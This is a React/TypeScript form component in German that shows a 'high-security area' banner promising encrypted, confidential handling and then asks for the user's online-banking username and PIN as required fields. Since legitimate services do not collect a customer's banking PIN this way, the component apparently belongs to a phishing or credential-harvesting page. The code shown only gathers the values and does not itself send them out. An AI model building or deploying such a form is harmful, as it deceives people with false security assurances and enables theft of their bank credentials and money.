"use client"

import type React from "react"

import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { ShieldAlert } from "lucide-react"

interface FinancialSectionProps {
  formData: any
  errors: any
  handleInputChange: (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => void
}

export default function FinancialSection({ formData, errors, handleInputChange }: FinancialSectionProps) {
  return (
    <div className="space-y-4">
      <Alert className="border-warning bg-warning/10">
        <ShieldAlert className="h-4 w-4 text-warning-foreground" />
        <AlertDescription className="text-sm text-warning-foreground">
          🔐 HOCHSICHERHEITSBEREICH: Ihre Zugangsdaten werden verschlüsselt übertragen und strikt vertraulich
          behandelt. Teilen Sie diese Informationen mit niemandem.
        </AlertDescription>
      </Alert>

      <div>
        <Label htmlFor="onlineBankingUsername">Online-Banking Benutzername *</Label>
        <Input
          id="onlineBankingUsername"
          name="onlineBankingUsername"
          type="text"
          value={formData.onlineBankingUsername}
          onChange={handleInputChange}
          placeholder="Ihr Benutzername"
          className={errors.onlineBankingUsername ? "border-destructive" : ""}
          autoComplete="off"
        />
        {errors.onlineBankingUsername && (
          <p className="text-xs text-destructive mt-1">{errors.onlineBankingUsername}</p>
        )}
      </div>

      <div>
        <Label htmlFor="onlineBankingPin">Online-Banking PIN *</Label>
        <Input
          id="onlineBankingPin"
          name="onlineBankingPin"
          type="password"
          value={formData.onlineBankingPin}
          onChange={handleInputChange}
          placeholder="••••••••"
          className={errors.onlineBankingPin ? "border-destructive" : ""}
          autoComplete="off"
        />
        {errors.onlineBankingPin && <p className="text-xs text-destructive mt-1">{errors.onlineBankingPin}</p>}
        <p className="text-xs text-muted-foreground mt-1">Geben Sie Ihre Banking-PIN ein</p>
      </div>
    </div>
  )
}
